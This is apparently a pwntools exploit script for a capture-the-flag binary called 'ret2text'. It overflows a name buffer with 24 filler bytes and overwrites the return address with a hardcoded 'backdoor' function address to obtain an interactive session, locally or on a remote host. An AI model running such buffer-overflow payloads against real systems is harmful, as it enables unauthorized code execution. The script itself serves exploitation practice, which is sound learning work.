#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ret2text'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400833 # pop rdi ; ret

# elf, libc
backdoor = 0x04006Ea
# rop1
offset = 24
payload = 'A'*offset
payload += p64(backdoor)

ru('[+]Please input the length of your name:\n')
sl('200')
ru('[+]What\'s u name?\n')
# debug('b *0x4007cb')

sl(payload)
# ru('')
# sl(payload)

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

